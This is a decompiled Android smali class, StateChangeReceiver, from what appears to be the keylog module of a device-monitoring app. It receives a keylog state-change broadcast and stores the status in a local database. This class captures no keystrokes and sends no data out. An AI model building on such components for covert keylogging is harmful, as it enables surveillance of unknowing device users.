.class public Lcom/hp/vd/module/monitor/keylog/StateChangeReceiver;
.super Landroid/content/BroadcastReceiver;
.source "StateChangeReceiver.java"


# instance fields
.field public final STATUS_UNKNOWN:I

.field public final TAG:Ljava/lang/String;

.field protected dao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/KeylogStateChangeData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected log:Lcom/hp/vd/agent/log/IWriter;


# direct methods
.method public constructor <init>(Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/KeylogStateChangeData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 23
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    const-string v0, "StateChangeReceiver"

    .line 16
    iput-object v0, p0, Lcom/hp/vd/module/monitor/keylog/StateChangeReceiver;->TAG:Ljava/lang/String;

    const/4 v0, -0x1

    .line 18
    iput v0, p0, Lcom/hp/vd/module/monitor/keylog/StateChangeReceiver;->STATUS_UNKNOWN:I

    .line 24
    iput-object p1, p0, Lcom/hp/vd/module/monitor/keylog/StateChangeReceiver;->dao:Lcom/j256/ormlite/dao/Dao;

    .line 25
    iput-object p2, p0, Lcom/hp/vd/module/monitor/keylog/StateChangeReceiver;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 4

    :try_start_0
    const-string p1, "com.hp.vb.intent.keylog.state_change"

    .line 32
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_0

    .line 33
    new-instance p1, Lcom/hp/vd/module/monitor/keylog/StateChangeWriter;

    iget-object v0, p0, Lcom/hp/vd/module/monitor/keylog/StateChangeReceiver;->dao:Lcom/j256/ormlite/dao/Dao;

    iget-object v1, p0, Lcom/hp/vd/module/monitor/keylog/StateChangeReceiver;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "status"

    const/4 v3, -0x1

    invoke-virtual {p2, v2, v3}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result p2

    invoke-direct {p1, v0, v1, p2}, Lcom/hp/vd/module/monitor/keylog/StateChangeWriter;-><init>(Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;I)V

    .line 35
    new-instance p2, Ljava/lang/Thread;

    const-string v0, "StateChangeReceiver-Writer-Thread"

    invoke-direct {p2, p1, v0}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    .line 36
    invoke-virtual {p2}, Ljava/lang/Thread;->run()V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    .line 40
    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_0
    :goto_0
    return-void
.end method
